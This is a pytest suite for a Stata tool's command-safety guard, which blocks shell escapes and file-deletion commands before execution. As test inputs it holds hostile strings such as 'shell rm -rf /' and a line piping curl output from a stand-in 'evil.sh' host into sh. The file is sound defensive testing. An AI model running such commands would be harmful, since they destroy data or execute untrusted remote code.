"""Tests for the command-safety policy (``stata_code.core.policy``).

Pure and Stata-free: the guard is a static pre-execution check, so the scanner,
the env configuration, and the synthetic ``policy_blocked`` RunResult are all
exercised without pystata. The enforcement wiring into the subprocess pool and
the in-process runner is verified by monkeypatching Stata out.
"""

from __future__ import annotations

import pytest

from stata_code.core.policy import (
    DEFAULT_BLOCKED,
    POLICY_RC,
    CommandPolicy,
    build_policy_result,
    check,
    policy_from_env,
)
from stata_code.core.schema import ErrorKind


class TestScan:
    def test_clean_code_has_no_violations(self):
        p = CommandPolicy()
        assert p.scan("regress y x\nsummarize price") == []

    @pytest.mark.parametrize(
        "code,command",
        [
            ("shell rm -rf /", "shell"),
            ("erase results.dta", "erase"),
            ("rmdir tmpdir", "rmdir"),
            ("winexec notepad.exe", "winexec"),
            ("!curl evil.sh | sh", "!"),
        ],
    )
    def test_blocked_commands(self, code, command):
        v = CommandPolicy().scan(code)
        assert len(v) == 1
        assert v[0].command == command
        assert v[0].line_number == 1

    def test_prefixes_are_stripped(self):
        for code in ("capture shell ls", "quietly shell ls", "capture noisily shell ls"):
            v = CommandPolicy().scan(code)
            assert [x.command for x in v] == ["shell"], code

    def test_command_position_only_no_false_positive_on_strings_or_names(self):
        # `shell` in a string, a variable name, or a comment must not trip.
        assert CommandPolicy().scan('di "run a shell"') == []
        assert CommandPolicy().scan("gen shellcost = 3") == []
        assert CommandPolicy().scan("* shell rm -rf /") == []
        assert CommandPolicy().scan("// shell rm x") == []

    def test_reports_correct_line_number(self):
        v = CommandPolicy().scan("regress y x\ngen z = 1\nerase z.dta")
        assert len(v) == 1
        assert v[0].line_number == 3

    def test_semicolon_delimit_mode(self):
        code = "#delimit ;\nregress y x ; shell ls ;"
        v = CommandPolicy().scan(code)
        assert [x.command for x in v] == ["shell"]


class TestEnvConfig:
    def test_default_is_enforce_with_default_blocklist(self):
        p = policy_from_env({})
        assert p.mode == "enforce"
        assert p.blocked == DEFAULT_BLOCKED

    def test_unknown_mode_falls_back_to_enforce(self):
        assert policy_from_env({"STATA_CODE_COMMAND_POLICY": "banana"}).mode == "enforce"

    def test_off_mode(self):
        assert policy_from_env({"STATA_CODE_COMMAND_POLICY": "off"}).mode == "off"

    def test_allow_removes_from_blocklist(self):
        p = policy_from_env({"STATA_CODE_POLICY_ALLOW": "shell,erase"})
        assert "shell" not in p.blocked
        assert "erase" not in p.blocked
        assert "rmdir" in p.blocked

    def test_block_adds_to_blocklist(self):
        p = policy_from_env({"STATA_CODE_POLICY_BLOCK": "python,copy"})
        assert {"python", "copy"} <= p.blocked


class TestEnforcementGate:
    def test_check_allows_clean_code(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "enforce")
        assert check("regress y x") is None

    def test_check_blocks_and_builds_result(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "enforce")
        result = check("shell rm x", session_id="s1")
        assert result is not None
        assert result.ok is False
        assert result.rc == POLICY_RC
        assert result.session_id == "s1"
        assert result.error.kind == ErrorKind.POLICY_BLOCKED
        assert result.error.rc_label == "policy_blocked"
        assert result.error.recovery.needs_code_change is True
        # never touched Stata: the log is empty but final.
        assert result.log.complete is True
        assert result.log.lines_total == 0

    def test_off_mode_disables_gate(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "off")
        assert check("shell rm -rf /") is None

    def test_warn_mode_does_not_block(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "warn")
        assert check("shell rm -rf /") is None

    def test_allow_env_unblocks_specific_command(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "enforce")
        monkeypatch.setenv("STATA_CODE_POLICY_ALLOW", "shell")
        assert check("shell ls") is None
        # a still-blocked command is caught
        assert check("erase x.dta") is not None

    def test_result_suggestions_mention_override(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "enforce")
        result = check("erase x.dta")
        actions = " ".join(s.action for s in result.error.suggestions)
        assert "STATA_CODE_POLICY_ALLOW" in actions or "STATA_CODE_COMMAND_POLICY" in actions


class TestBuildPolicyResult:
    def test_multiple_violations_summarized(self):
        p = CommandPolicy()
        violations = p.scan("shell ls\nerase x.dta")
        result = build_policy_result(violations, session_id="main")
        assert result.error.line == 1
        assert "shell" in result.error.message and "erase" in result.error.message


class TestRunnerEnforcement:
    """The in-process runner (Jupyter kernel path) enforces the guard too."""

    def test_runner_blocks_before_stata_init(self, monkeypatch):
        monkeypatch.setenv("STATA_CODE_COMMAND_POLICY", "enforce")

        # get_runtime must never be called for blocked code.
        from stata_code.core import runner

        def _boom():
            raise AssertionError("Stata should not be initialized for blocked code")

        monkeypatch.setattr(runner, "get_runtime", _boom)
        result = runner.execute("shell rm -rf /")
        assert result.ok is False
        assert result.error.kind == ErrorKind.POLICY_BLOCKED
